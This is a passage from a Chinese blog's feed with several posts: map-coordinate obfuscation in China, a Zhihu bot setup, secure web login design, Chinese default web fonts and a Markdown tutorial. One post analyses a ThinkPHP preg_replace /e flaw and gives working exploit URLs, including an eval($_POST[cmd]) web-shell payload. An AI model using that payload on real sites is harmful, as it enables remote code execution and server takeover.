插件，是需要收费的，早期的时候，一个导航仪就需要 10 块钱的 Bao Mi 插件许可费，恩， Bao Mi 插件也不是白用的，毕竟国家花了很多的钱和人力和物力才做出来的保护国家安全的 Bao Mi 东西怎么可以随便送你用呢，收点钱也就算是正常也算是在预料之中啦。现在的话，好像已经下放到地图数据公司了，就是看这个地图数据公司的经营状况，大概会出货多少份电子地图，然后一次性收取地图数据公司多少钱，可能是多少百万，然后这个钱呢，你们数据公司就自己找你们的导航软件公司的客户收吧，算在每一台设备中的许可费，恩，国家的办事效率变高了，一次直接从导航电子地图公司收费比逐个收取导航软件公司的钱要来的容易和不那么麻烦。</p><p>现阶段，有些人或者组织，为了自己的利益，将导航软件和导航地图进行 XX，并发现了导航电子地图中存在的地图偏差，所以就采取人为的手段，将地图反加密，将虚假的坐标转换成标准的 WGS84 坐标，最笨的方法就是线性的平移，大概偏差的距离为 500 米，基本上能够反回来，但误差较大，特别是南北距离加大的情况下，而聪明一点的方法，用 matlab 等工具计算出其中的曲线，然后反转回来。多么的可怕那，这是触犯国家法律的行为，国家的安全就这样被你们破坏了，这是一个刑事问题，而不是简单的 XX 软件 XX 地图的经济犯罪问题了。请大家务必务必遵守国家的法律，不要干出这样的傻事出来，出了事谁都保不了你，毕竟你将成为国家的敌人。</p><p>最后，说说 Bao Mi 插件带来的弊端，好处不容忽视，国家为了安全考虑， Bao Mi 了就安全了，但弊端是，制造了人为的障碍，非常的不好用，比如导航软件出来的坐标，不能和 Google Earth 等国际软件匹配，Google Earth 和 Map 在国内基本上就是废物。进一步带来的导航问题是，寻宝、分享等许多好玩的 GPS 活动，都无法在大陆地区展开，这一点真的让人很无奈。当然，也有一些时候，由于导航软件的 Bao Mi 插件问题，导致不能导航等等。 Bao Mi 插件，是一个让人哭笑不得的东西，就如同国际的 WGS84 坐标对我们的 54 坐标或者 80 坐标，就如同最近的国家部门准备开发“影像中国”反制 google earth 的泄密问题。等等种种，法律不可逾越，但我们也不希望人为的制造麻烦，或者为了更深入的经济利益。<br>这就是国家的导航 Bao Mi 插件问题吧，希望大家能够理解。</p><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><ul><li>rticle from <a href="http://www.gpshk.cc/forum.php?mod=viewthread&tid=136780">http://www.gpshk.cc/forum.php?mod=viewthread&tid=136780</a></li><li>All Maps in China are Transformed.<a href="http://home.wangjianshuo.com/archives/20081109_all_maps_in_china_are_transformed.htm">http://home.wangjianshuo.com/archives/20081109_all_maps_in_china_are_transformed.htm </a></li><li>ios-dev-map-offset-in-china.<a href="http://stackoverflow.com/questions/7262459/ios-dev-map-offset-in-china">http://stackoverflow.com/questions/7262459/ios-dev-map-offset-in-china</a></li><li>OFFSET MAPPING ISSUE IN CHINA. <a href="http://productforums.google.com/forum/#!topic/maps/zVmRao1Im3w">http://productforums.google.com/forum/#!topic&#x2F;maps&#x2F;zVmRao1Im3w</a></li><li>more ,google it…</li></ul>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 纠偏 </tag>
            
            <tag> 火星坐标 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>清水河畔知乎机器人</title>
      <link href="/2013/05/24/%E6%B8%85%E6%B0%B4%E6%B2%B3%E7%95%94%E7%9F%A5%E4%B9%8E%E6%9C%BA%E5%99%A8%E4%BA%BA/"/>
      <url>/2013/05/24/%E6%B8%85%E6%B0%B4%E6%B2%B3%E7%95%94%E7%9F%A5%E4%B9%8E%E6%9C%BA%E5%99%A8%E4%BA%BA/</url>
      
        <content type="html"><![CDATA[<p>知乎机器人源码JAVA重量级版正式放到Github上面了，Git地址：<a href="https://github.com/yuercl/">https://github.com/yuercl/</a>myNews</p><p>整个知乎机器人构建于Springside4，详情参考：<a href="https://github.com/springside/springside4">https://github.com/springside/springside4</a><br>注意：本源码做学习用，请勿扰乱河畔，欢迎大家拓展，登录复杂的可以找校花要key，@xsjswt# 参考：校花的河畔一键登录接口小范围公测  <a href="http://bbs.qshpan.com/read.php?tid=1319124&fpage=0&page=1">http://bbs.qshpan.com/read.php?tid=1319124&fpage=0&page=1</a></p><p>第一步下载源码：git下来</p><p>第二步依赖：jdk版本大于6，本机安装maven，并配置好本地仓库，mysql数据库</p><p>第三部 config：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config.properties，中按要求设置用户名和密码</span><br><span class="line">application.properties，数据库用户名和密码</span><br><span class="line">hibernate.cfg.xml，数据库信息，用户自动生成数据库，自己导入sql也行，那么这个文件就没用了</span><br><span class="line">applicationContext.xml，设置crontab，发布频率</span><br></pre></td></tr></table></figure><p>第四步 run：运行jetty脚本，等待吧，第一次运行会下载依赖包。                </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eclipse_rebuild.bat 用于生成eclipse项目</span><br><span class="line">jetty.bat 内嵌jetty容器，喜欢tomcat的走开</span><br><span class="line">dependency.bat 依赖</span><br><span class="line">package.bat 打包成war，可用户发布到tomcat、jboss等</span><br><span class="line">refresh-db.bat 用户刷新数据库，一般不怎么用，也就是执行scheme下面的sql文件，在pom.xml里面有配置。</span><br></pre></td></tr></table></figure><p>技术是死的，优质的内容才是价值所在。不建议大家都来转发知乎，或者是转发糗百。。。<br>顺便说一下，springside是个不错的框架。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 知乎机器人 </tag>
            
            <tag> 清水河畔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP URL漏洞可执行任意系统命令</title>
      <link href="/2012/06/09/ThinkPHP%E7%9A%84URL%E6%BC%8F%E6%B4%9E%E5%8F%AF%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4/"/>
      <url>/2012/06/09/ThinkPHP%E7%9A%84URL%E6%BC%8F%E6%B4%9E%E5%8F%AF%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>ThinkPHP 是一款国内使用比较广泛的老牌 PHP MVC 框架，有不少创业公司或者项目都用了这个框架,<br>ThinkPHP 不正确过滤用户提交的参数，远程攻击者可以利用漏洞以应用程序上下文执行任意 PHP 代码。</p><p>分析一下官方的补丁:<br>&#x2F;trunk&#x2F;ThinkPHP&#x2F;Lib&#x2F;Core&#x2F;Dispatcher.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">125</span>  -   <span class="variable">$res</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;@(w+)&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;([^&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;\/]+)@e&#x27;</span>, <span class="string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span>, <span class="title function_ invoke__">implode</span>(<span class="variable">$depr</span>,<span class="variable">$paths</span>));</span><br><span class="line"><span class="number">125</span>  +   <span class="variable">$res</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;@(w+)&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;([^&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;\/]+)@e&#x27;</span>, <span class="string">&#x27;$var[\&#x27;\\1\&#x27;]=\&#x27;\\2\&#x27;;&#x27;</span>, <span class="title function_ invoke__">implode</span>(<span class="variable">$depr</span>,<span class="variable">$paths</span>));</span><br></pre></td></tr></table></figure><p>这个代码是把 pathinfo 当作 restful 类型 url 进行解析的，主要作用是把 pathinfo 中的数据解析并合并到$_GET 数组中。<br>然而在用正则解析 pathinfo 的时候，主要是这一句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="variable">$res</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;@(w+)&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;([^&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;\/]+)@e&#x27;</span>, <span class="string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span>, <span class="title function_ invoke__">implode</span>(<span class="variable">$depr</span>,<span class="variable">$paths</span>));</span><br></pre></td></tr></table></figure><p>这里明显使用了 preg_replace 的&#x2F;e 参数，这是个非常危险的参数，如果用了这个参数，preg_replace 第二个参数就会被当做 php 代码执行，</p><p>用这种方式在第二个参数中，利用 PHP 代码给数组动态赋值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span></span><br></pre></td></tr></table></figure><p>而这里又是双引号，而双引号中的 php 变量语法又是能够被解析执行的。</p><p>因此，攻击者只要对任意一个使用 thinkphp 框架编写的应用程序，</p><p>使用如下方式进行访问，即可执行任意 PHP 代码：</p><p><a href="http://site.com/index.php/module/action/param1/$%7B@phpinfo()%7D">http://site.com/index.php/module/action/param1/${@phpinfo()}</a><br>如：</p><p><a href="http://localhost/ThinkPHP_3.0_Full/Examples/Form/index.php/module/action/param1/$%7B@phpinfo()%7D%E7%9B%B4%E6%8E%A5%E6%8B%BF">http://localhost/ThinkPHP_3.0_Full/Examples/Form/index.php/module/action/param1/${@phpinfo()}直接拿</a> SHELL 类同。。。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php/module/action/param1/$&#123;@<span class="keyword">eval</span>%<span class="number">28</span><span class="variable">$_POST</span>[cmd]%<span class="number">29</span>&#125;</span><br></pre></td></tr></table></figure><p>密码：cmd</p><p>不多说了。。。</p>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你会做Web上的用户登录功能吗</title>
      <link href="/2012/04/12/%E4%BD%A0%E4%BC%9A%E5%81%9AWeb%E4%B8%8A%E7%9A%84%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%8A%9F%E8%83%BD%E5%90%97/"/>
      <url>/2012/04/12/%E4%BD%A0%E4%BC%9A%E5%81%9AWeb%E4%B8%8A%E7%9A%84%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%8A%9F%E8%83%BD%E5%90%97/</url>
      
        <content type="html"><![CDATA[<p>Web上的用户登录功能应该是最基本的功能了，可是在我看过一些站点的用户登录功能后，我觉得很有必要写一篇文章教大家怎么来做用户登录功能。下面的文章告诉大家这个功能可能并没有你所想像的那么简单，这是一个关系到用户安全的功能，希望大家能从下面的文章中能知道什么样的方法才是一个好的用户登录功能。以下内容，转载时请保持原文一致，并请注明作者和出处。</p><h2>用户名和口令</h2><p>首先，我们先来说说用户名和口令的事。这并不是本站第一次谈论这个事了。如何管理自己的口令让你知道怎么管理自己的口令，破解你的口令让你知道在现代这样速度的计算速度下，用穷举法破解你的口令可能会是一件很轻松的事。在这里我想告诉从开发者的角度上来做设计这个用户名和口令的事。下面一几件规则：</p><ul><li><p><strong>限制用户输入一些非常容易被破解的口令</strong>。如什么qwert，123456, password之类，就像twitter限制用户的口令一样做一个口令的黑名单。另外，你可以限制用户口令的长度，是否有大小写，是否有数字，你可以用你的程序做一下校验。当然，这可能会让用户感到很不爽，所以，现在很多网站都提供了UX让用户知道他的口令强度是什么样的（比如这个有趣的UX），这样可以让用户有一个选择，目的就是告诉用户——要想安全，先把口令设得好一点。</p></li><li><p><strong>千万不要明文保存用户的口令</strong>。正如如何管理自己的口令所说的一样，很多时候，用户都会用相同的ID相同的口令来登录很多网站。所以，如果你的网站明文保存的话，那么，如果你的数据被你的不良员工流传出去那对用户是灾难性的。所以，用户的口令一定要加密保存，最好是用不可逆的加密，如MD5或是SHA1之类的有hash算法的不可逆的加密算法。CSDN曾明文保存过用户的口令。（另，对于国内公司的品行以及有关部门的管理方式，我不敢保证国内网站以加密的方式保存你的口令。我觉得，做为一个有良知的人，我们应该加密保存用户的口令）</p></li><li><p><strong>是否让浏览器保存口令</strong>。我们有N多的方法可以不让浏览器保存用户名和口令。但是这可能对用户来说很不爽。因为在真实世界里谁也记得不住那么多的口令。很多用户可能会使用一些密码管理工具来保存密码，浏览器只是其中一种。是否让浏览器保存这个需要你做决定，重点是看一下你的系统的安全级别是否要求比较高，如果是的话，则不要让浏览器保存密码，并在网站明显的位置告诉用户——保存口令最安全的地方只有你的大脑。</p></li><li><p><strong>口令在网上的传输</strong>。因为HTTP是明文协议，所以，用户名和口令在网上也是明文发送的，这个很不安全。你可以看看这篇文章你就明白了。要做到加密传输就必需使用HTTPS协议。但是，在中国还是有很多网站的Web登录方式还在使用ActiveX控件，这可能成为IE6还大量存在的原因。我通常理解为这些ActiveX控件是为了反键盘记录程序的。 不过，我依然觉ActiveX控件不应该存在，因为在国外的众多安全很重要的站点上都看不到ActiveX的控件的身影。</p></li></ul><h2>用户登录状态</h2><p>首先，我想告诉大家的是，因为HTTP是无状态的协议，也就是说，这个协议是无法记录用户访问状态的，其每次请求都是独立的无关联的，一笔是一笔。而我们的网站都是设计成多个页面的，所在页面跳转过程中我们需要知道用户的状态，尤其是用户登录的状态，这样我们在页面跳转后我们才知道是否可以让用户有权限来操作一些功能或是查看一些数据。</p><p><strong>所以，我们每个页面都需要对用户的身份进行认证</strong>。当然，我们不可能让用户在每个页面上输入用户名和口令，这会让用户觉得我们的网站相当的SB。为了实现这一功能，用得最多的技术就是浏览器的cookie，我们会把用户登录的信息存放在客户端的cookie里，这样，我们每个页面都从这个cookie里获得用户是否登录的信息，从而达到记录状态，验证用户的目的。但是，你真的会用cookie吗？下面是使用cookie的一些原则。</p><ul><li><p><strong>千万不要在cookie中存放用户的密码</strong>。加密的密码都不行。因为这个密码可以被人获取并尝试离线穷举。所以，你一定不能把用户的密码保存在cookie中。我看到太多的站点这么干了。</p></li><li><p><strong>正确设计“记住密码”</strong>。这个功能简直就是一个安全隐患，我觉得并不是所有的程序员都知道怎么设计这个事。一般的设计 是——一时用户勾选了这个功能，系统会生成一个cookie，cookie包括用户名和一个固定的散列值，这个固定的散列值一直使用。这样，你就可以在所有的设备和客户上都可以登录，而且可以有多个用户同时登录。这个并不是很安全。下面是一些更为安全的方法供你参考：</p><ul><li> 在cookie中，保存三个东西——<strong>用户名，登录序列，登录token</strong>。<strong>用户名</strong>：明文存放。<strong>登录序列</strong>：一个被MD5散列过的随机数，仅当强制用户输入口令时更新（如：用户修改了口令）。<strong>登录token</strong>：一个被MD5散列过的随机数，仅一个登录session内有效，新的登录session会更新它。</li><li> 上述三个东西会存在服务器上，服务器的验证用户需要验证客户端cookie里的这三个事。</li><li> 这样的设计会有什么样的效果，会有下面的效果，<ul><li>a) <strong>登录token</strong> 是单实例登录。意思就是一个用户只能有一个登录实例。</li><li>b) <strong>登录序列</strong> 是用来做盗用行为检测的。    如果用户的cookie被盗后，盗用者使用这个cookie访问网站时，我们的系统是以为是合法用户，    然后更新“登录token”，而真正的用户回来访问时，系统发现只有“用户名”和“登录序列”相同，    但是“登录token” 不对，这样的话，系统就知道，这个用户可能出现了被盗用的情况，    于是，系统可以清除并更改登录序列 和 登录token，这样就可以令所有的cookie失效，并要求用户输入口令。    并给警告用户系统安全。</li>    </ul>    <pre><code>&lt;/li&gt;</code></pre><li> 当然，<strong>上述这样的设计还是会有一些问题，比如：同一用户的不同设备登录，甚至在同一个设备上使用不同的浏览器保登录</strong>。一个设备会让另一个设备的登录token和登录序列失效，从而让其它设备和浏览器需要重新登录，并会造成cookie被盗用的假象。所以，你在服务器服还需要考虑- IP 地址，<ul><li>a) 如果以口令方式登录，我们无需更新服务器的“登录序列”和 “登录token”（但需要更新cookie）。因为我们认为口令只有真正的用户知道。</li><li>b) 如果 <strong>IP相同</strong> ，那么，我们无需更新服务器的“登录序列”和 “登录token”（但需要更新cookie）。因为我们认为是同一用户有同一IP（当然，同一个局域网里也有同一IP，但我们认为这个局域网是用户可以控制的。网吧内并不推荐使用这一功能）。</li><li>c) 如果 （<strong>IP不同 &amp;&amp; 没有用口令登录</strong>），那么，“登录token” 就会在多个IP间发生变化（登录token在两个或多个ip间被来来回回的变换），当在一定时间内达到一定次数后，系统才会真正觉得被盗用的可能性很高，此时系统在后台清除“登录序列”和“登录token“，让Cookie失效，强制用户输入口令（或是要求用户更改口令），以保证多台设备上的cookie一致。</li></ul></li></ul></li><li><p><strong>不要让cookie有权限访问所有的操作</strong>。否则就是XSS攻击，这个功能请参看新浪微博的XSS攻击。下面的这些功能一定要用户输入口令：</p><ul><li> 修改口令。</li><li> 修改电子邮件。（电子邮件通常用来找回用户密码，最好通发邮件或是发手机短信的方式修改，或者干脆就不让改一一用电子邮件做帐号名）</li><li> 用户的隐私信息。</li><li> 用户消费功能。</li></ul></li><li><p><strong>权衡Cookie的过期时间</strong>。如果是永不过期，会有很不错的用户体验，但是这也会让用户很快就忘了登录密码。如果设置上过期期限，比如2周，一个月，那么可能会好一点，但是2周和一个月后，用户依然会忘了密码。尤其是用户在一些公共电脑上，如果保存了永久cookie的话，等于泄露了帐号。所以，对于cookie的过期时间我们还需要权衡。</p></li></ul><h2>找回口令的功能</h2><p>找回口令的功能一定要提供。但是很多朋友并不知道怎么来设计这个功能。我们有很多找回口令的设计，下面我逐个点评一下。</p><ul><li><p><strong>千万不要使用安全问答</strong>。事实证明，这个环节很烦人，而且用户并不能很好的设置安全问答。什么，我的生日啊，我母亲的生日，等等。因为今天的互联网和以前不一样了，因为SNS，今天的互联比以前更真实了，我可以上facebook，开心，人人网，LinkedIn查到你的很多的真实的信息。通过这些信息我可以使用安全问答来重设你的口令。 这里需要说一下 Facebook，Facebook的安全问答很强大，还要你通过照片认人，呵呵。</p></li><li><p><strong>不要重置用户的密码</strong>。因为这有可能让用户的密码遭到恶意攻击。当然，你要发个邮件给用户让其确认，用户点击邮件中的一个链接，你再重置。我并不推荐这样的方法，因为用户一般都会用笔记下来这个很难记的口令，然后登录系统，因为登录系统时使用了“记住密码”的功能，所以导致用户不会去修改密码，从而要么导到被写下来的密码被人盗取，要么又忘记了密码。</p></li><li><p><strong>好一点的做法</strong>——通过邮件自行重置。当用户申请找回口令功能的时候，系统生成一个MD5唯一的随机字串（可通过UID+IP+timestamp+随机数），放在数据库中，然后设置上时限（比如1小时内），给用户发一个邮件，这个连接中包含那个MD5的字串的链接，用户通过点击那个链接来自己重新设置新的口令。</p></li><li><p><strong>更好一点的做法</strong>——多重认证。比如：通过手机+邮件的方式让用户输入验证码。手机+邮件可能还不把握，因为手机要能会丢了，而我的手机可以访问我的邮箱。所以，使用U盾，SecureID（一个会变化的6位数token），或是通过人工的方式核实用户身份。当然，这主要看你的系统的安全级别了。</p></li></ul><h2>口令探测防守</h2><ul><li><p><strong>使用验证码</strong>。验证码是后台随机产生的一个短暂的验证码，这个验证码一般是一个计算机很难识别的图片。这样就可以防止以程序的方式来尝试用户的口令。事实证明，这是最简单也最有效的方式。当然，总是让用户输入那些肉眼都看不清的验证码的用户体验不好，所以，可以折中一下。比如Google，当他发现一个IP地址发出大量的搜索后，其会要求你输入验证码。当他发现同一个IP注册了3个以上的gmail邮箱后，他需要给你发短信方式或是电话方式的验证码。</p></li><li><p><strong>用户口令失败次数</strong>。调置口令失败的上限，如果失败过多，则把帐号锁了，需要用户以找回口令的方式来重新激活帐号。但是，这个功能可能会被恶意人使用。最好的方法是，增加其尝试的时间成本（以前的这篇文章说过一个增加时间成本的解密算法）。如，两次口令尝试的间隔是5秒钟。三次以上错误，帐号被临时锁上30秒，5次以上帐号被锁1分钟，10次以上错误帐号被锁4小时……但是这会导致恶意用户用脚本来攻击，所以最好再加上验证码，验证码出错次数过多不禁止登录而是禁lP。</p></li><li><p><strong>系统全局防守</strong>。上述的防守只针对某一个别用户。恶意者们深知这一点，所以，他们一般会动用“僵尸网络”轮着尝试一堆用户的口令，所以上述的那种方法可能还不够好。我们需要在系统全局域上监控所有的口令失败的次数。当然，这个需要我们平时没有受到攻击时的数据做为支持。比如你的系统，平均每天有5000次的口令错误的事件，那么你可以认为，当口令错误大幅超过这个数后，而且时间相对集中，就说明有黑客攻击。这个时候你怎么办？一般最常见使用的方法是让所有的用户输错口令后再次尝试的时间成本增加。</p></li></ul><p>最后，再说一下，关于用户登录，使用第三方的 OAuth 和 OpenID 也不失为一个很不错的选择。</p><p><strong>参考文章</strong></p><ul><li>OWASP Guide To Authentication</li><li>Dos and Don’ts of Client Authentication on the Web （PDF）</li><li>Charles Miller’s Persistent Login Cookie Best Practice</li><li>Wikipedia: HTTP cookie</li><li>Personal knowledge questions for fallback authentication: Security questions in the era of Facebook</li></ul><p>原文来自：<a href="http://coolshell.cn/articles/5353.html">http://coolshell.cn/articles/5353.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最佳 Web 中文默认字体</title>
      <link href="/2012/04/12/%E6%9C%80%E4%BD%B3%20Web%20%E4%B8%AD%E6%96%87%E9%BB%98%E8%AE%A4%E5%AD%97%E4%BD%93/"/>
      <url>/2012/04/12/%E6%9C%80%E4%BD%B3%20Web%20%E4%B8%AD%E6%96%87%E9%BB%98%E8%AE%A4%E5%AD%97%E4%BD%93/</url>
      
        <content type="html"><![CDATA[<p>作者：<a href="http://weibo.com/lifesinger">@lifesinger</a></p><hr><p>最近淘宝网首页有个小小的 默认字体调整风波，中文默认字体远比我们想象中的复杂。以前主要关注 font-family 自身，忽略了 lang 属性和 charset 设置。今天做了个更详尽的测试：</p><p><a href="http://lifesinger.github.com/lab/2011/default-fonts/">http://lifesinger.github.com/lab/2011/default-fonts/</a></p><p>在不同操作系统下，用各个浏览器打开，特别是 Firefox 和 Opera，混乱的世界啊，真真的与浏览器斗，乐趣全无！</p><p>虽然沮丧悲情愤，但分析研究的工作还是得继续：</p><ul><li>lang, charset 和 font-family 都会对默认字体产生影响，规律很复杂。</li><li>浏览器偏好里的字体设置，对默认字体有直接影响，比如 WebKit 内核的 Chrome 浏览器。</li><li>宋体转成 “\5b8b\4f53” 也不能通吃所有浏览器。比如在 Mac OS 的 Chrome 中，只认识 simsun.</li><li><del>宋体其实是 serif 有衬线字体，后面跟 sans-serif, 逻辑上是错的。</del><br>（修正：并没有规定前面的 font name 要和最后的 general family 保持一致）</li><li>不同操作系统下，各个浏览器默认的 sans-serif 中文字体，一般都是最佳选择或用户已调整为最佳，不能强制用户都用宋体。</li></ul><p>从目前用户反馈的情况来看，在以 12px 大小为主的网页设计中，<strong>最佳的中文默认字体方案是：Windows 下用宋体，其他操作系统下用雅黑等无衬线字体</strong>。未来随着电脑屏幕的变大和分辨率的提高，当字体的默认大小提高到 14px 以上时，或许所有操作系统下，最佳中文默认字体会统一为雅黑等无衬线字体。</p><p>为了让所有网页在尽可能多的情况下，都用最佳中文字体渲染，需要特别考虑以下几点：</p><ul><li>在 Mac Chrome 等环境下，用 font-family: times, sans-serif 时，<br>中文字体并不会根据 sans-serif 渲染，而是会根据 times 的 serif 属性，<br>选择默认的 serif 中文字体来渲染。<br>比如在 Mac Chrome 下，默认 serif 中文字体是很接近宋体的一个字体，比较难看。<br>（修正：实际情况更为复杂，请参考评论中的讨论）</li><li>在 Firefox 中，只要 font-family 中有宋体，中文必然就用宋体展现。<br>所以 font-family 中不能有宋体。</li><li>当 lang&#x3D;“zh-CN”, charset&#x3D;“utf-8” 时，<br>font: arial 在 Mac Firefox 等环境下，默认中文字体是宋体。</li><li>在英文 Win7 下，只要 charset&#x3D;“gbk”, 当 font-family 为 arial, sans-serif 时，<br><del>默认中文字体是很难看的 Microsoft Sans Serif Regular.</del><br>（修正：是 fallback 到了韩文字体 Dotum&#x2F;Gulim（gulim.ttc）来显示，<br>Dotum&#x2F;Gulim 没有的字符最终会 fallback 到 SimSun，暂时不知道日文字体是否夹在中间。<br>和 Microsoft Sans Serif 没有一点关系。）</li><li>Opera 是个恐怖的世界，不要尝试分析其规律，最后测试一下就好。</li></ul><p>可以总结出：</p><ol><li><p>如果页面 charset 是 utf-8, 完美的默认字体方案是：</p><pre><code> font-family: arial, sans-serif;</code></pre></li></ol><p>  无论省略 lang 还是设置为 zh-CN, 在各种环境下都满足预期。</p><ol start="2"><li><p>如果页面 charset 是 gbk, 推荐默认字体方案为：</p><pre><code> font-family: arial;</code></pre></li></ol><p>  Chrome OS 下未测试，根据陈成博客上的反馈，<br>  好像会因为没有 sans-serif 而导致中文字体很难看。<br>  不过考虑 Chrome OS 还未正式发布，目前可以先忽略。</p><p>最后，个人推荐简体中文页面的最佳实践为：</p><pre><code>html lang=zh-CNcharset=utf-8font-family: arial, sans-serif;</code></pre><p>测试环境说明：</p><pre><code>Mac OS X 10.6.7Chrome 10.0.648.204Firefox 4.0Safari 5.0.4Opera 11.01Win7 UltimateIE 9.0.8080.16413</code></pre><p>补充：</p><ol><li>关于字体的默认大小和行高等信息，推荐博文：<a href="http://justjavac.com/web/2012/04/13/default-web-font-style.html">默认 Web 字体样式</a></li><li>关于字体的 fallback 等文本渲染信息，推荐博文：<a href="http://justjavac.com/web/2012/04/13/how-do-browsers-render-text.html">浏览器如何渲染文本</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 字体 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown 快速入门</title>
      <link href="/2012/03/30/Markdown%20%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/"/>
      <url>/2012/03/30/Markdown%20%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<p><strong>声明：</strong> 这份文档派生(fork)于<a href="http://markdown.tw/">繁体中文版</a>，在此基础上进行了繁体转简体工作，并进行了适当的润色。此文档用 Markdown 语法编写，你可以到这里<a href="http://gitcafe.com/riku/Markdown-Syntax-CN/blob/master/basics.md">查看它的源文件</a>。「繁体中文版的原始文件可以<a href="https://github.com/othree/markdown-syntax-zhtw/blob/master/basics.md">查看这里</a>」–By @<a href="http://twitter.com/riku">riku</a> &#x2F; 本项目托管于 <a href="http://gitcafe.com/riku/Markdown-Syntax-CN">GitCafe</a></p><p><strong>注：</strong> 本项目同时也托管于 <a href="https://github.com/riku/Markdown-Syntax-CN">Github</a>上，请通过 fork＋pull request 方式来帮忙改进本项目。</p><h1 id="Markdown-Basics-（快速入门）-x2F-点击查看完整语法说明"><a href="#Markdown-Basics-（快速入门）-x2F-点击查看完整语法说明" class="headerlink" title="Markdown: Basics （快速入门） &#x2F; (点击查看完整语法说明)"></a>Markdown: Basics （快速入门） &#x2F; (<a href="../markdown-syntax">点击查看完整语法说明</a>)</h1><h2 id="Getting-the-Gist-of-Markdown’s-Formatting-Syntax"><a href="#Getting-the-Gist-of-Markdown’s-Formatting-Syntax" class="headerlink" title="Getting the Gist of Markdown’s Formatting Syntax"></a>Getting the Gist of Markdown’s Formatting Syntax</h2><p>此页提供了 Markdown 的简单概念， <a href="http://gitcafe.com/riku/Markdown-Syntax-CN/blob/master/syntax.md" title="Markdown Syntax">语法说明</a> 页提供了完整详细的文档，说明了每项功能。但是 Markdown 其实很简单就可以上手，此页文档提供了一些范例，并且每个范例都会提供输出的 HTML 结果。</p><p>其实直接试试看也是一个很不错的方法， <a href="http://daringfireball.net/projects/markdown/dingus" title="Markdown Dingus">Dingus</a> 是一个网页应用程序，你可以把自已编写的 Markdown 文档转成 XHTML。</p><h2 id="段落、标题、区块代码"><a href="#段落、标题、区块代码" class="headerlink" title="段落、标题、区块代码"></a>段落、标题、区块代码</h2><p>一个段落是由一个以上的连接的行句组成，而一个以上的空行则会划分出不同的段落（空行的定义是显示上看起来像是空行，就被视为空行，例如有一行只有空白和 tab，那该行也会被视为空行），一般的段落不需要用空白或换行缩进。</p><p>Markdown 支持两种标题的语法，[Setext] <a href="http://docutils.sourceforge.net/mirror/setext.html">1</a> 和 [atx] <a href="http://www.aaronsw.com/2002/atx/">2</a> 形式。Setext 形式是用底线的形式，利用 <code>=</code> （最高阶标题）和 <code>-</code> （第二阶标题），Atx 形式在行首插入 1 到 6 个 <code>#</code> ，对应到标题 1 到 6 阶。</p><p>区块引用则使用 email 形式的 ‘<code>&gt;</code>‘ 角括号。</p><p>Markdown 语法:</p><pre><code>A First Level Header====================A Second Level Header---------------------Now is the time for all good men to come tothe aid of their country. This is just aregular paragraph.The quick brown fox jumped over the lazydog&#39;s back.### Header 3&gt; This is a blockquote.&gt; &gt; This is the second paragraph in the blockquote.&gt;&gt; ## This is an H2 in a blockquote</code></pre><p>输出 HTML 为：</p><pre><code>&lt;h1&gt;A First Level Header&lt;/h1&gt;&lt;h2&gt;A Second Level Header&lt;/h2&gt;&lt;p&gt;Now is the time for all good men to come tothe aid of their country. This is just aregular paragraph.&lt;/p&gt;&lt;p&gt;The quick brown fox jumped over the lazydog&#39;s back.&lt;/p&gt;&lt;h3&gt;Header 3&lt;/h3&gt;&lt;blockquote&gt;&lt;p&gt;This is a 